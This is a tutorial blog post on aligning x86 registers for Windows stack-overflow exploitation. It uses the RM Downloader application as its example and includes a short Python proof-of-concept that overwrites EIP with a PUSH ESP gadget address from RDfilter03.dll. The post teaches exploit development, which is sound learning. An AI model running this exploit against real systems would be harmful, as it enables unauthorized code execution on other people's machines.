---
layout: post
title: Alignment on Windows Registers
date: 2020-03-26 14:45:00
categories: posts
comments: false
en: true
---

# Preamble

Welcome once again to my website! Within this post, i will be introducing methods to align x86 registers on Windows, topic that was hard for me to find when starting regarding Binary Exploitation.

Also, i would like to say that if by any means you find an error within these post, please let me know! I am still learning regarding the subject.

## Small requirements

Despite the fact that these techniques do not require much knowledge, having beginner/intermediate experience with Assembly may help.

# Explanation of the concept

The definition of the word "alignment" is "arrangement in a straight line or in correct relative positions.", meaning that, when applied 
to CPU registers, it would refer to having two or more variables with the same value. 

# Why aligning registers?

In order to execute shellcode within a stack, the payload will have to work directly with a register pointing to its address. For example, msfvenom always includes 6 additional bytes within all generated payloads, whose function is to align a register, so the rest can work with such. However, not all softwares may accept such characters, issue which brings us to this post!

## The application

In order to perform this technique practically, i will use as an example the RM Downloader application, which i made a post about [here](https://whitecr0wz.github.io/posts/RM-Downloader-SEH/).

I would like to remark that i won't be explaining the usual steps to perform a Stack Buffer Overflow/SEH Overwrite, as i have done such in previous posts/findings. Instead, i will be focusing the technique regarding alignments. I strongly recommend to follow the [post](https://whitecr0wz.github.io/posts/RM-Downloader-SEH/) regarding the application, so that in case you would like to replicate what was shown here won't be a hassle.

# Stack Overflows

To begin with an easy practice, it will be shown how a JMP/CALL/PUSH ESP instruction does everything that was done previously, by overwriting the EIP value, as it automatically aligns the ESP value with the previous one, doing the entire work for us!

Current poc:

```term
import struct 

pushesp = struct.pack("<I", 0x1003DF53) #   0x1003df53 : "\x54\xC3" |  {PAGE_EXECUTE_READ} [RDfilter03.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Mini-stream\RM Downloader\RDfilter03.dll)

buffer = "A" * 8704 + pushesp + "\xff" * 200

f = open ("poc.txt", "w")
f.write(buffer)
f.close()
```

Once the script is run and the explotation process is completed, the debugger greets us with the following result:

[]!(/assets/img/Alignments/1.png)

It is important to note the values of the ESP and EIP registers, as they have been aligned by the PUSH ESP instruction.
